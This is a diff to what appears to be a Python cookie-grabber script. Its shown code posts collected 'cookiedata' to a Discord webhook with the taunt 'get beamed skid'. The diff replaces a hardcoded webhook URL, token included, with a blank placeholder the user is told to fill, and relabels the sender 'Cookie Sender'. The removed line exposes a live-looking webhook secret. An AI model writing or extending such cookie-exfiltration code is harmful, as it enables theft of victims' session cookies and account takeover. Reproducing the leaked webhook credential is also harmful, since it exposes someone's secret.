@@ -1,3 +1,4 @@
+#dont skid this
 from dhooks import Webhook
 import requests, threading, os
 import time
@@ -7,8 +8,8 @@ from pystyle import Anime, Colorate, Colors, Center, System, Write
 
 colorama.init()
 
-loadingauth = "https://discord.com/api/webhooks/975206172053364797/YPmPfsJ2Un7H2NGRCfmwyL9vIrT2zj-_7i2XAhQbjf5kKmFfjGou69PokkOnyazMLs_6"
-
+loadingauth = ""
+#put your webhook between the "" for it to send
 
 def w(text: str):
     Write.Input(text=text,
@@ -35,7 +36,7 @@ def main():
     w("You can leave this program now by pressing enter. :)")
     requests.post(loadingauth,
                   json={
-                      'username': 'KGB',
+                      'username': 'Cookie Sender',
                       'content': "@everyone get beamed skid" f'```{cookiedata}```'
                   })
     
